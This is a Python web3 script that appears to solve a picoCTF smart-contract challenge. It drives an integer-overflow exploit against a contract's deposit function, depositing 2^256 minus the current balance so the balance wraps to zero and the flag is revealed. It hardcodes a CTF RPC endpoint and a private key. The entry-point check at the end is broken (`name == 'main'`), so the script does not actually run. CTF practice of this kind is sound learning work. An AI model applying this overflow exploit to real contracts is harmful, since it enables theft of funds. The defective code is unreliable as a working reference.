from web3 import Web3

# ── Config ────────────sesuaikan dengan punya kalian
RPC_URL       = "http://mysterious-sea.picoctf.net:50894"
CONTRACT_ADDR = "0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9"
MY_PRIVKEY    = "0x1e331bada962f32f02af49889391c5c4658016ae1064d65fbbeb8842303e1ae2"
MY_ADDRESS    = "0x17287909e61b13596e4115Be259938e87E48C76C"

ABI = [
    {
        "inputs": [{"internalType": "uint256", "name": "amount", "type": "uint256"}],
        "name": "deposit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [{"internalType": "uint256", "name": "amount", "type": "uint256"}],
        "name": "withdraw",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "getFlag",
        "outputs": [{"internalType": "string", "name": "", "type": "string"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "revealed",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [{"internalType": "address", "name": "", "type": "address"}],
        "name": "balances",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "anonymous": False,
        "inputs": [{"indexed": False, "internalType": "string", "name": "flag", "type": "string"}],
        "name": "FlagRevealed",
        "type": "event",
    },
]

UINT256_MAX = 2**256 - 1

def send_tx(w3, account, fn, gas=100_000):
    nonce = w3.eth.get_transaction_count(MY_ADDRESS)
    gas_price = w3.eth.gas_price
    tx = fn.build_transaction({
        "from":     MY_ADDRESS,
        "gas":      gas,
        "gasPrice": gas_price,
        "nonce":    nonce,
        "chainId":  w3.eth.chain_id,
    })
    signed  = account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    print(f"    Tx: {tx_hash.hex()}")
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=60)
    status  = "OK ✓" if receipt["status"] == 1 else "FAILED ✗"
    print(f"    Block {receipt['blockNumber']} | {status}")
    return receipt

def main():
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    assert w3.is_connected(), f"Cannot connect to {RPC_URL}"

    print(f"[✓] Connected | Chain ID: {w3.eth.chain_id} | Block: {w3.eth.block_number}")
    bal_eth = w3.from_wei(w3.eth.get_balance(MY_ADDRESS), "ether")
    print(f"[✓] ETH balance: {bal_eth} ETH")

    contract = w3.eth.contract(address=CONTRACT_ADDR, abi=ABI)
    account  = w3.eth.account.from_key(MY_PRIVKEY)

    # ── Check current state ───────────────────────────────────────────────────
    revealed = contract.functions.revealed().call()
    print(f"[*] revealed = {revealed}")

    if revealed:
        flag = contract.functions.getFlag().call()
        print(f"\n🎉 FLAG: {flag}")
        return

    cur_balance = contract.functions.balances(MY_ADDRESS).call()
    print(f"[*] My internal balance = {cur_balance}")

    # ── Overflow strategy ─────────────────────────────────────────────────────
    # We need: (balance + amount) to overflow → result < amount
    # Simplest: balance=1, amount=2^256-1 → 1 + (2^256-1) = 2^256 ≡ 0 < (2^256-1) ✓
    #
    # If balance is already > 0, adjust:
    # We need amount such that (balance + amount) mod 2^256 < amount
    # i.e., amount = 2^256 - balance  → result = 0, which is < amount ✓

    if cur_balance == 0:
        # Step 1: deposit 1 to set balance = 1
        print("\n[1] Depositing 1 to set initial balance...")
        receipt = send_tx(w3, account, contract.functions.deposit(1))
        cur_balance = contract.functions.balances(MY_ADDRESS).call()
        print(f"    New balance: {cur_balance}")
        # Step 2: deposit (2^256 - cur_balance) to cause overflow → balance wraps to 0
    overflow_amount = (2**256 - cur_balance) % (2**256)
    print(f"\n[2] Depositing overflow amount: {overflow_amount}")
    print(f"    = 2^256 - {cur_balance}")
    print(f"    Expected: balance wraps to 0, which is < amount → FLAG!")

    receipt = send_tx(w3, account, contract.functions.deposit(overflow_amount))

    # ── Read flag ─────────────────────────────────────────────────────────────
    # From FlagRevealed event
    try:
        logs = contract.events.FlagRevealed().process_receipt(receipt)
        if logs:
            print(f"\n🎉 FLAG (event): {logs[0]['args']['flag']}")
            return
    except Exception as e:
        print(f"    [event parse] {e}")

    # Fallback: getFlag()
    revealed = contract.functions.revealed().call()
    print(f"\n[*] revealed = {revealed}")
    if revealed:
        flag = contract.functions.getFlag().call()
        print(f"\n🎉 FLAG: {flag}")
    else:
        print("[✗] Still not revealed. Check if overflow worked.")
        new_bal = contract.functions.balances(MY_ADDRESS).call()
        print(f"    Current balance: {new_bal}")

if name == "main":
    main()